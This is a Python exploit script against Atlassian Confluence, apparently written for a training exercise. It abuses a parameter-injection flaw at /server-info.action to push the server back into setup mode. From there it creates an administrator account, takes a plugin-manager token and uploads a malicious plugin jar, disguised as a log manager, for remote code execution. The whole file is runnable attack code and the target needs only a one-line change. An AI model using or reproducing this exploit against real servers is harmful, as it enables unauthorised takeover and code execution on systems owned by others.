#   Exploit on vulnerable confluence for NETS
#   Author: Ensign STAR
#   Impact: Create an admin user and upload a malicious plugin to get RCE
#   Possible scenarios it might not work: If there's mandatory 2FA?

import requests
import base64

URL = 'localhost:8090'
target_endpoint = '/setup/setupadministrator.action'
FULL_URL = 'http://' + URL
headers = {'X-Atlassian-Token': 'no-check', 'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36'}

created_username = "test_admin"
created_password = "test_admin"
data = {'username': created_username, 'fullName': 'ensign_star', 'email': 'ensign@ensign.com', 'password': created_password, 'confirm': created_password, 'setup-next-button': 'Next'}

print("[+] Trigger vulnerability to achieve bootstrapping again")

# Trigger vulnerability such that boostrap is not done
r = requests.get(FULL_URL + '/server-info.action?bootstrapStatusProvider.applicationConfig.setupComplete=false', headers=headers)
if r.status_code != 200:
    print('[-] Unable to achieve bootstrapping again')
    exit(1)

print("[*] Confluence in bootstrap mode")
print("[+] Creating new admin")

r = requests.post(FULL_URL+target_endpoint, headers=headers, data=data)
if r.status_code != 200:
    print("[-] Unable to create admin")
    exit(1)


print("[*] Complete the bootstrap process")

r = requests.post(FULL_URL + '/setup/finishsetup.action', headers=headers)
if r.status_code != 200:
    print("[-] Unable to complete the bootstrap process")
    exit(1)


print("[*] Get token as the new admin")
basic_auth = b'Basic ' + base64.b64encode(str.encode(created_username) + b':' + str.encode(created_password))
token_headers = {'Authorization': basic_auth, 'User-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36', 'Accept': "*/*"}
r = requests.get(FULL_URL + "/rest/plugins/1.0/?os_authType=basic", headers = token_headers)

if r.status_code != 200:
    print('[-] Unable to get token')
    exit(1)

token = r.headers['upm-token']

print("[+] Obtained token for REST API")
print("[+] Uploading plugin")

# Upload plugin
files = {'plugin': ('atlassian_logmanager.jar', open('logger-1.0.0-SNAPSHOT.jar', 'rb'),'application/octet-stream')}
r = requests.post(FULL_URL + "/rest/plugins/1.0/?token=" +token, headers=token_headers, files=files)

print(r.status_code)
print(r.text)


print("[+] If success, use the python client to interact with the confluence server")


